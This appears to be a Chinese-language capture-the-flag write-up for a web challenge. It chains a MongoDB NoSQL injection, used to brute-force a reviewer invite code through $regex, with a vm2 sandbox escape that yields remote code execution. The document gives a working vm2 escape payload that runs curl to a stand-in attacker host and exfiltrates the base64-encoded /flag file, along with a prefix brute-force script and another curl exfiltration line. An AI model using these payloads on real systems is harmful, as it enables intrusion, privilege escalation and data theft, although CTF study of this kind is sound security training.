这题的核心利用链是：

> **MongoDB NoSQL 注入（拿 reviewer 权限） → vm2 沙箱逃逸（RCE） → 读 `/flag`**

我把关键点和利用步骤都审计出来了。

---

# 1. Reviewer 邀请码存在 NoSQL 注入

漏洞位置：

```js
// lib/profileImport.js

function buildServiceDeskPacket(record, rubric) {
  ...
  return {
    queue: policy.queue,
    slotField: SERVICE_DESK_CREDENTIALS[policy.credential] || SERVICE_DESK_CREDENTIALS.invitation,
    slotValue: valueAtPath(record.retainedMetadata, fieldPath),
    recordId: record._id
  };
}
```

```js
function assignmentSlotQuery(submitted, rubric, packet) {
  return {
    used: false,
    track: submitted.track,
    kind: packet.queue,
    rubricId: rubric.rubricId,
    [packet.slotField]: packet.slotValue
  };
}
```

这里：

```js
packet.slotField === "code"
```

而：

```js
packet.slotValue
```

完全来自用户上传 JSON：

```js
committee.registration.reference
```

没有任何过滤。

---

## 实际效果

Mongo 查询会变成：

```js
{
  used: false,
  track: "systems",
  kind: "overflow",
  rubricId: "big1-overflow-systems",
  code: { "$regex": "^abc" }
}
```

于是我们可以：

* 用 `$regex`
* 对 reviewer invite code 做前缀爆破

---

# 2. 先注册普通用户

正常注册即可。

---

# 3. 上传恶意 reviewer profile

接口：

```http
POST /reviewer/profile
```

上传 multipart：

字段：

```txt
track=systems
areas=systems,review process,artifact sanity
score=100
statement=test
```

再上传：

```json
{
  "committee": {
    "registration": {
      "reference": {
        "$regex": "^a"
      }
    }
  }
}
```

---

# 4. 提交 reviewer profile

```http
POST /reviewer/profile/submit
```

---

# 5. 利用 service-sync 爆破邀请码

接口：

```http
POST /reviewer/profile/service-sync
```

如果 regex 命中：

返回：

```txt
Committee service desk has an available assignment slot.
```

否则：

```txt
Committee service desk has not found an assignment slot yet.
```

---

## 爆破脚本逻辑

邀请码格式：

```js
/^[0-9a-f]{36}$/
```

因此逐位爆破：

```python
charset = "0123456789abcdef"
prefix = ""

while len(prefix) < 36:
    for c in charset:
        test = prefix + c

        payload = {
          "$regex": "^" + test
        }

        # 上传 profile
        # 调 service-sync

        if "available assignment slot" in resp:
            prefix += c
            break
```

最终拿到：

```txt
committee-shadow@aaa26.big1
对应的邀请码
```

---

# 6. Claim reviewer 身份

接口：

```http
POST /reviewer/claim
```

提交：

```txt
email=committee-shadow@aaa26.big1
code=<爆破出的code>
```

成功后：

```js
enableReviewer()
```

会把你升级成 reviewer：

```js
role: 'reviewer'
```

---

# 7. Reviewer Search 存在 vm2 沙箱逃逸

漏洞位置：

```js
// lib/filters.js

const { VM } = require('vm2');

function runReviewerExpression(expression, item) {
  const source = `
    const paper = item.paper;
    const review = item.review;
    const reviewer = item.reviewer;
    const scores = item.scores;
    Boolean((() => (${expression}))())
  `;

  return runExpression(source, item);
}
```

这里直接：

```js
vm.run(source)
```

用户完全可控。

---

# 8. vm2 逃逸 → RCE

项目依赖：

```json
"vm2": "^3.11.2"
```

vm2 本身长期存在大量 sandbox escape。

这里可以直接走公开 vm2 escape。

---

# 9. 最终 payload（读 flag）

接口：

```http
POST /api/reviewer/filter
```

payload：

```js
(()=>{

async function fn() {
    throw new Error();
}

let p = fn();

p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                x => x,
                err => {

                    const process =
                        err.constructor.constructor(
                            'return process'
                        )();

                    const cp =
                        process.mainModule.require(
                            'child_process'
                        );

                    cp.execSync(
                        'curl http://YOUR-VPS/$(cat /flag|base64 -w0)'
                    );
                }
            );
        }
    }
};

p.then();

return true;

})()
```

---

# 10. 为什么需要外带（exfiltration）

因为：

```js
return !!vm.run(source);
```

表达式结果只会被转成：

```js
true / false
```

所以不能直接回显 flag。

因此最稳的是：

```bash
curl YOUR_SERVER/$(cat /flag)
```

或者 DNS 外带。

---

# 最终利用链总结

## Step 1

注册普通用户

---

## Step 2

利用 reviewer profile 的 Mongo 注入：

```json
{"$regex":"^xxx"}
```

爆破 reviewer invite code

---

## Step 3

claim reviewer 身份

---

## Step 4

调用：

```http
/api/reviewer/filter
```

利用 vm2 escape 拿 RCE

---

## Step 5

读取：

```bash
cat /flag
```

---
